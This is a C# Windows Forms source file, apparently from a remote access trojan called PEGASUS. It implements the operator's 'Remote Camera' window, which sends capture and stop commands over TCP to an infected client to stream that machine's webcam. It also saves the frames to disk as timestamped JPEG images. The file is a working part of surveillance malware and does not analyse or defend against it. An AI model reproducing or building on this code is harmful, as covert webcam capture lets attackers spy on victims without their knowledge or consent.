using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using PEGASUS.Connection;
using PEGASUS.MessagePack;

namespace PEGASUS.Forms
{

	public class FormWebcam : Form
	{
		public Stopwatch sw = Stopwatch.StartNew();

		public int FPS;

		public bool SaveIt;

		private IContainer components;

		private Panel panel1;

		public PictureBox pictureBox1;

		public System.Windows.Forms.Timer timer1;

		private System.Windows.Forms.Timer timerSave;

		public Label labelWait;

		private Label label2;

		public Guna2ComboBox comboBox1;

		private Guna2PictureBox guna2PictureBox1;

		private Label label1;

		public Guna2NumericUpDown numericUpDown1;

		public Guna2GradientButton btnSave;

		public Guna2GradientButton button1;

		private PictureBox pictureBox2;

		private Guna2Separator guna2Separator1;

		private Guna2BorderlessForm guna2BorderlessForm1;

		private Guna2ShadowForm guna2ShadowForm1;

		public PEGASUSMain F { get; set; }

		internal Clients Client { get; set; }

		internal Clients ParentClient { get; set; }

		public string FullPath { get; set; }

		public Image GetImage { get; set; }

		public FormWebcam()
		{
			InitializeComponent();
		}

		private void Button1_Click(object sender, EventArgs e)
		{
			try
			{
				if (button1.Tag == "play")
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "webcam";
					msgPack.ForcePathObject("Command").AsString = "capture";
					msgPack.ForcePathObject("List").AsInteger = comboBox1.SelectedIndex;
					msgPack.ForcePathObject("Quality").AsInteger = Convert.ToInt32(numericUpDown1.Value);
					ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
					button1.Tag = "stop";
					numericUpDown1.Enabled = false;
					comboBox1.Enabled = false;
					btnSave.Enabled = true;
				}
				else
				{
					button1.Tag = "play";
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "webcam";
					msgPack2.ForcePathObject("Command").AsString = "stop";
					ThreadPool.QueueUserWorkItem(Client.Send, msgPack2.Encode2Bytes());
					numericUpDown1.Enabled = true;
					comboBox1.Enabled = true;
					btnSave.Enabled = false;
					timerSave.Stop();
				}
			}
			catch
			{
			}
		}

		private void Timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				if (!ParentClient.TcpClient.Connected || !Client.TcpClient.Connected)
				{
					Close();
				}
			}
			catch
			{
				Close();
			}
		}

		private void FormWebcam_FormClosed(object sender, FormClosedEventArgs e)
		{
			try
			{
				ThreadPool.QueueUserWorkItem(delegate
				{
					Client?.Disconnected();
				});
			}
			catch
			{
			}
		}

		private void BtnSave_Click(object sender, EventArgs e)
		{
			if (button1.Tag != "stop")
			{
				return;
			}
			if (SaveIt)
			{
				SaveIt = false;
				return;
			}
			try
			{
				if (!Directory.Exists(FullPath))
				{
					Directory.CreateDirectory(FullPath);
				}
				Process.Start(FullPath);
			}
			catch
			{
			}
			SaveIt = true;
		}

		private void TimerSave_Tick(object sender, EventArgs e)
		{
			try
			{
				if (!Directory.Exists(FullPath))
				{
					Directory.CreateDirectory(FullPath);
				}
				pictureBox1.Image.Save(FullPath + "\\IMG_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".jpeg", ImageFormat.Jpeg);
			}
			catch
			{
			}
		}

		private void guna2PictureBox1_Click(object sender, EventArgs e)
		{
			Close();
		}

		[DllImport("user32.DLL")]
		private static extern void ReleaseCapture();

		[DllImport("user32.DLL")]
		private static extern void SendMessage(IntPtr hwnd, int wmsg, int wparam, int lparam);

		private void guna2Panel1_MouseDown(object sender, MouseEventArgs e)
		{
			ReleaseCapture();
			SendMessage(base.Handle, 274, 61458, 0);
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
			components = new System.ComponentModel.Container();
			System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(FormWebcam));
			panel1 = new System.Windows.Forms.Panel();
			pictureBox2 = new System.Windows.Forms.PictureBox();
			label1 = new System.Windows.Forms.Label();
			guna2PictureBox1 = new Guna.UI2.WinForms.Guna2PictureBox();
			btnSave = new Guna.UI2.WinForms.Guna2GradientButton();
			button1 = new Guna.UI2.WinForms.Guna2GradientButton();
			comboBox1 = new Guna.UI2.WinForms.Guna2ComboBox();
			numericUpDown1 = new Guna.UI2.WinForms.Guna2NumericUpDown();
			label2 = new System.Windows.Forms.Label();
			guna2Separator1 = new Guna.UI2.WinForms.Guna2Separator();
			pictureBox1 = new System.Windows.Forms.PictureBox();
			timer1 = new System.Windows.Forms.Timer(components);
			timerSave = new System.Windows.Forms.Timer(components);
			labelWait = new System.Windows.Forms.Label();
			guna2BorderlessForm1 = new Guna.UI2.WinForms.Guna2BorderlessForm(components);
			guna2ShadowForm1 = new Guna.UI2.WinForms.Guna2ShadowForm(components);
			panel1.SuspendLayout();
			((System.ComponentModel.ISupportInitialize)pictureBox2).BeginInit();
			((System.ComponentModel.ISupportInitialize)guna2PictureBox1).BeginInit();
			((System.ComponentModel.ISupportInitialize)numericUpDown1).BeginInit();
			((System.ComponentModel.ISupportInitialize)pictureBox1).BeginInit();
			SuspendLayout();
			panel1.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			panel1.Controls.Add(pictureBox2);
			panel1.Controls.Add(label1);
			panel1.Controls.Add(guna2PictureBox1);
			panel1.Controls.Add(btnSave);
			panel1.Controls.Add(button1);
			panel1.Controls.Add(comboBox1);
			panel1.Controls.Add(numericUpDown1);
			panel1.Controls.Add(label2);
			panel1.Controls.Add(guna2Separator1);
			panel1.Dock = System.Windows.Forms.DockStyle.Top;
			panel1.Font = new System.Drawing.Font("Electrolize", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			panel1.ForeColor = System.Drawing.Color.LightGray;
			panel1.Location = new System.Drawing.Point(0, 0);
			panel1.Margin = new System.Windows.Forms.Padding(2);
			panel1.Name = "panel1";
			panel1.Size = new System.Drawing.Size(769, 80);
			panel1.TabIndex = 3;
			panel1.MouseDown += new System.Windows.Forms.MouseEventHandler(guna2Panel1_MouseDown);
			pictureBox2.Image = (System.Drawing.Image)resources.GetObject("pictureBox2.Image");
			pictureBox2.Location = new System.Drawing.Point(12, 11);
			pictureBox2.Name = "pictureBox2";
			pictureBox2.Size = new System.Drawing.Size(40, 42);
			pictureBox2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
			pictureBox2.TabIndex = 150;
			pictureBox2.TabStop = false;
			label1.AutoSize = true;
			label1.Location = new System.Drawing.Point(345, 39);
			label1.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
			label1.Name = "label1";
			label1.Size = new System.Drawing.Size(42, 14);
			label1.TabIndex = 149;
			label1.Text = "Device:";
			guna2PictureBox1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			guna2PictureBox1.BackColor = System.Drawing.Color.Transparent;
			guna2PictureBox1.Image = (System.Drawing.Image)resources.GetObject("guna2PictureBox1.Image");
			guna2PictureBox1.ImageRotate = 0f;
			guna2PictureBox1.Location = new System.Drawing.Point(728, 11);
			guna2PictureBox1.Name = "guna2PictureBox1";
			guna2PictureBox1.ShadowDecoration.Parent = guna2PictureBox1;
			guna2PictureBox1.Size = new System.Drawing.Size(29, 29);
			guna2PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
			guna2PictureBox1.TabIndex = 148;
			guna2PictureBox1.TabStop = false;
			guna2PictureBox1.UseTransparentBackground = true;
			guna2PictureBox1.Click += new System.EventHandler(guna2PictureBox1_Click);
			btnSave.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
			btnSave.BorderThickness = 1;
			btnSave.CheckedState.Parent = btnSave;
			btnSave.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			btnSave.CustomImages.Parent = btnSave;
			btnSave.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
			btnSave.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
			btnSave.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
			btnSave.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
			btnSave.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
			btnSave.DisabledState.Parent = btnSave;
			btnSave.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			btnSave.FillColor2 = System.Drawing.Color.FromArgb(36, 36, 36);
			btnSave.Font = new System.Drawing.Font("Electrolize", 9f);
			btnSave.ForeColor = System.Drawing.Color.White;
			btnSave.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
			btnSave.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			btnSave.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
			btnSave.HoverState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			btnSave.HoverState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			btnSave.HoverState.ForeColor = System.Drawing.Color.FromArgb(191, 37, 33);
			btnSave.HoverState.Parent = btnSave;
			btnSave.Location = new System.Drawing.Point(69, 42);
			btnSave.Name = "btnSave";
			btnSave.ShadowDecoration.Parent = btnSave;
			btnSave.Size = new System.Drawing.Size(132, 32);
			btnSave.TabIndex = 147;
			btnSave.Text = "Capture On/Off";
			btnSave.Click += new System.EventHandler(BtnSave_Click);
			button1.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
			button1.BorderThickness = 1;
			button1.CheckedState.Parent = button1;
			button1.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			button1.CustomImages.Parent = button1;
			button1.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
			button1.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
			button1.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
			button1.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
			button1.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
			button1.DisabledState.Parent = button1;
			button1.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			button1.FillColor2 = System.Drawing.Color.FromArgb(36, 36, 36);
			button1.Font = new System.Drawing.Font("Electrolize", 9f);
			button1.ForeColor = System.Drawing.Color.White;
			button1.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
			button1.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 37, 33);
			button1.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
			button1.HoverState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			button1.HoverState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			button1.HoverState.ForeColor = System.Drawing.Color.FromArgb(191, 37, 33);
			button1.HoverState.Parent = button1;
			button1.Location = new System.Drawing.Point(69, 8);
			button1.Name = "button1";
			button1.ShadowDecoration.Parent = button1;
			button1.Size = new System.Drawing.Size(132, 32);
			button1.TabIndex = 146;
			button1.Text = "Start/Stop";
			button1.Click += new System.EventHandler(Button1_Click);
			comboBox1.BackColor = System.Drawing.Color.Transparent;
			comboBox1.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
			comboBox1.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
			comboBox1.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
			comboBox1.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			comboBox1.FocusedColor = System.Drawing.Color.FromArgb(94, 148, 255);
			comboBox1.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
			comboBox1.FocusedState.Parent = comboBox1;
			comboBox1.Font = new System.Drawing.Font("Electrolize", 9.749999f);
			comboBox1.ForeColor = System.Drawing.Color.FromArgb(191, 37, 33);
			comboBox1.HoverState.Parent = comboBox1;
			comboBox1.ItemHeight = 30;
			comboBox1.ItemsAppearance.Parent = comboBox1;
			comboBox1.Location = new System.Drawing.Point(398, 15);
			comboBox1.Name = "comboBox1";
			comboBox1.ShadowDecoration.Parent = comboBox1;
			comboBox1.Size = new System.Drawing.Size(190, 36);
			comboBox1.TabIndex = 145;
			numericUpDown1.BackColor = System.Drawing.Color.Transparent;
			numericUpDown1.BorderColor = System.Drawing.Color.FromArgb(36, 36, 36);
			numericUpDown1.Cursor = System.Windows.Forms.Cursors.IBeam;
			numericUpDown1.DisabledState.Parent = numericUpDown1;
			numericUpDown1.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
			numericUpDown1.FocusedState.Parent = numericUpDown1;
			numericUpDown1.Font = new System.Drawing.Font("Electrolize", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			numericUpDown1.ForeColor = System.Drawing.Color.LightGray;
			numericUpDown1.Location = new System.Drawing.Point(265, 27);
			numericUpDown1.Minimum = new decimal(new int[4] { 20, 0, 0, 0 });
			numericUpDown1.Name = "numericUpDown1";
			numericUpDown1.ShadowDecoration.Parent = numericUpDown1;
			numericUpDown1.Size = new System.Drawing.Size(56, 27);
			numericUpDown1.TabIndex = 144;
			numericUpDown1.UpDownButtonFillColor = System.Drawing.Color.FromArgb(191, 37, 33);
			numericUpDown1.UpDownButtonForeColor = System.Drawing.Color.White;
			numericUpDown1.Value = new decimal(new int[4] { 50, 0, 0, 0 });
			label2.AutoSize = true;
			label2.Location = new System.Drawing.Point(231, 39);
			label2.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
			label2.Name = "label2";
			label2.Size = new System.Drawing.Size(29, 14);
			label2.TabIndex = 143;
			label2.Text = "FPS:";
			guna2Separator1.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
			guna2Separator1.BackColor = System.Drawing.Color.Transparent;
			guna2Separator1.FillColor = System.Drawing.Color.FromArgb(36, 36, 36);
			guna2Separator1.Location = new System.Drawing.Point(-265, 74);
			guna2Separator1.Name = "guna2Separator1";
			guna2Separator1.Size = new System.Drawing.Size(1299, 10);
			guna2Separator1.TabIndex = 151;
			guna2Separator1.UseTransparentBackground = true;
			pictureBox1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
			pictureBox1.Location = new System.Drawing.Point(0, 84);
			pictureBox1.Margin = new System.Windows.Forms.Padding(2);
			pictureBox1.Name = "pictureBox1";
			pictureBox1.Size = new System.Drawing.Size(768, 452);
			pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
			pictureBox1.TabIndex = 5;
			pictureBox1.TabStop = false;
			timer1.Interval = 1000;
			timer1.Tick += new System.EventHandler(Timer1_Tick);
			timerSave.Interval = 1000;
			timerSave.Tick += new System.EventHandler(TimerSave_Tick);
			labelWait.AutoSize = true;
			labelWait.Font = new System.Drawing.Font("Electrolize", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			labelWait.Location = new System.Drawing.Point(213, 192);
			labelWait.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
			labelWait.Name = "labelWait";
			labelWait.Size = new System.Drawing.Size(102, 19);
			labelWait.TabIndex = 6;
			labelWait.Text = "Please wait...";
			guna2BorderlessForm1.ContainerControl = this;
			guna2BorderlessForm1.ShadowColor = System.Drawing.Color.FromArgb(191, 37, 33);
			guna2ShadowForm1.ShadowColor = System.Drawing.Color.FromArgb(191, 37, 33);
			guna2ShadowForm1.TargetForm = this;
			base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 14f);
			base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			base.ClientSize = new System.Drawing.Size(769, 538);
			base.Controls.Add(labelWait);
			base.Controls.Add(pictureBox1);
			base.Controls.Add(panel1);
			Font = new System.Drawing.Font("Electrolize", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			ForeColor = System.Drawing.Color.LightGray;
			base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
			base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
			base.Margin = new System.Windows.Forms.Padding(2);
			base.Name = "FormWebcam";
			Text = "Remote Camera";
			base.FormClosed += new System.Windows.Forms.FormClosedEventHandler(FormWebcam_FormClosed);
			panel1.ResumeLayout(false);
			panel1.PerformLayout();
			((System.ComponentModel.ISupportInitialize)pictureBox2).EndInit();
			((System.ComponentModel.ISupportInitialize)guna2PictureBox1).EndInit();
			((System.ComponentModel.ISupportInitialize)numericUpDown1).EndInit();
			((System.ComponentModel.ISupportInitialize)pictureBox1).EndInit();
			ResumeLayout(false);
			PerformLayout();
		}
	}
}